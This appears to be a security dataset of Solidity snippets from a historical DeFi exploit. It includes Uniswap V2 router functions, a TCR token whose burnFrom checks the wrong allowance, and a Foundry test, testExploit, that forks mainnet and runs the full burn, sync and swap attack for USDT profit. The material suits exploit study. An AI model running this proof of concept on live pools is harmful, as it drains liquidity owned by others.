[
  {
    "contract/interface": "IPairPoolInterface",
    "source_type": "victim_contract",
    "function_name": "sync",
    "original_code": "    function sync() external lock {\n        _update(IERC20(token0).balanceOf(address(this)), IERC20(token1).balanceOf(address(this)), reserve0, reserve1);\n    }\n}\n",
    "description": ""
  },
  {
    "contract/interface": "IUNIswapV2",
    "source_type": "victim_contract",
    "function_name": "swapExactETHForTokens",
    "original_code": "    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)\n        external\n        virtual\n        override\n        payable\n        ensure(deadline)\n        returns (uint[] memory amounts)\n    {\n        require(path[0] == WETH, 'UniswapV2Router: INVALID_PATH');\n        amounts = UniswapV2Library.getAmountsOut(factory, msg.value, path);\n        require(amounts[amounts.length - 1] >= amountOutMin, 'UniswapV2Router: INSUFFICIENT_OUTPUT_AMOUNT');\n        IWETH(WETH).deposit{value: amounts[0]}();\n        assert(IWETH(WETH).transfer(UniswapV2Library.pairFor(factory, path[0], path[1]), amounts[0]));\n        _swap(amounts, path, to);\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "IUNIswapV2",
    "source_type": "victim_contract",
    "function_name": "swapExactTokensForTokens",
    "original_code": "    function swapExactTokensForTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external virtual override ensure(deadline) returns (uint[] memory amounts) {\n        amounts = UniswapV2Library.getAmountsOut(factory, amountIn, path);\n        require(amounts[amounts.length - 1] >= amountOutMin, 'UniswapV2Router: INSUFFICIENT_OUTPUT_AMOUNT');\n        TransferHelper.safeTransferFrom(\n            path[0], msg.sender, UniswapV2Library.pairFor(factory, path[0], path[1]), amounts[0]\n        );\n        _swap(amounts, path, to);\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ExploitTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ExploitTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ExploitTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ExploitTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ExploitTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ExploitTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        cheats.createSelectFork(\"mainnet\", 14_139_082 - 1);\n        cheats.label(address(usdt), \"USDT\");\n        cheats.label(address(TCR), \"TCR\");\n        cheats.label(address(route), \"UniswapRoute\");\n        cheats.label(address(weth), \"WETH\");\n        cheats.label(address(pool), \"PairPool\");\n        deal(address(this), 0.04 ether);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ExploitTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ExploitTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ExploitTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ExploitTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ExploitTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ExploitTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ExploitTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() external {\n        IUSDTInterface(usdt).approve(route, type(uint256).max);\n        ITcrInterface(TCR).approve(route, type(uint256).max);\n        ITcrInterface(TCR).approve(pool, type(uint256).max);\n\n        emit log_named_decimal_uint(\n            \"Exploiter USDT balance before attack\", IERC20(usdt).balanceOf(address(this)), IERC20(usdt).decimals()\n        );\n        uint256 wethAmount = address(this).balance;\n        address[] memory path = new address[](3);\n        path[0] = weth;\n        path[1] = usdt;\n        path[2] = TCR;\n        uint256 deadline = block.timestamp + 24 hours;\n\n        IUNIswapV2(route).swapExactETHForTokens{value: wethAmount}(1, path, address(this), deadline);\n        uint256 poolTCRbalance = IERC20(TCR).balanceOf(pool);\n        ITcrInterface(TCR).burnFrom(pool, poolTCRbalance - 100_000_000);\n        uint256 attackerTCRbalance = IERC20(TCR).balanceOf(address(this));\n        IPairPoolInterface(pool).sync();\n        address[] memory path2 = new address[](2);\n        path2[0] = TCR;\n        path2[1] = usdt;\n        IUNIswapV2(route).swapExactTokensForTokens(attackerTCRbalance, 1, path2, address(this), deadline);\n\n        emit log_named_decimal_uint(\n            \"Exploiter USDT balance after attack\", IERC20(usdt).balanceOf(address(this)), IERC20(usdt).decimals()\n        );\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ITcrInterface",
    "source_type": "victim_contract",
    "function_name": "approve",
    "original_code": "    function approve(address spender, uint256 amount) external {\n        if (deprecated) {\n            return\n                IUpgradedToken(upgradedAddress).approveByLegacy(\n                    msg.sender,\n                    spender,\n                    amount\n                );\n        }\n        _approve(msg.sender, spender, amount);\n    }\n\n    //\n    // \"burnable\"\n    //\n",
    "description": ""
  },
  {
    "contract/interface": "ITcrInterface",
    "source_type": "victim_contract",
    "function_name": "burnFrom",
    "original_code": "    function burnFrom(address from, uint256 amount) external {\n        require(_allowances[msg.sender][from] >= amount, ERROR_ATL);\n        require(_balances[from] >= amount, ERROR_BTL);\n        _approve(msg.sender, from, _allowances[msg.sender][from] - amount);\n        _burn(from, amount);\n    }\n\n    //\n    // \"transfer\"\n    //\n",
    "description": ""
  }
]